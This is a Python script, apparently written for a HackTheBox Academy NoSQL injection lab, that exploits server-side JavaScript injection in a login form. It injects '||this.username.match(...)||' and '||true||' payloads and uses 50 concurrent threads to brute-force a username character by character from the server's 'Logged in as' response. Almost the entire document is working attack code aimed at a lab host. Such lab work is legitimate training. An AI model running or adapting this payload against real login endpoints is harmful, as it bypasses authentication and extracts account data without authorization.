#!/usr/bin/evn python3

'''This script exploits a server side javascript injection on a NoSQL database to get a username.  
Created this script to solve the HackTheBox Academy lab called 'Server-Side Javascript Injeciton' for the module called 'NoSQL INJECTION' '''

import requests
import string
import concurrent.futures

target="94.237.61.84:49981"
proxies= {"http":"http://127.0.0.1:8080"}
headers= {"Content-type":"application/x-www-form-urlencoded"}

# Create list
def create_charlist():
    clist= string.ascii_letters+string.digits+"{}'\"!@_#%"
    return clist

# Run Blind Server Side Javascript Injection on NoSQL query
def nosqli(completed_word, char):
    data=f'username="||this.username.match(\'^{completed_word}{char}.*$\')||"&password="||true||"'
    response= requests.post(url=f"http://{target}/index.php", proxies=proxies, headers=headers, verify=False, allow_redirects=True, data=data) 

    if "Logged in as" in response.text:
        return char
    else:
        pass

# Increase speed
def increase_speed():
    completed_word=""
    while True:
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            charlist= create_charlist()
            future_response= {executor.submit(nosqli,completed_word,char):(completed_word,char) for char in charlist}
            for future in concurrent.futures.as_completed(future_response):
                result= future.result()
                if result is not None:
                    completed_word+=result
                    print(f"{completed_word}")
                else:
                    pass

try:
    increase_speed()
except KeyboardInterrupt:
    print("Ctrl + C detected, exiting gracefully")
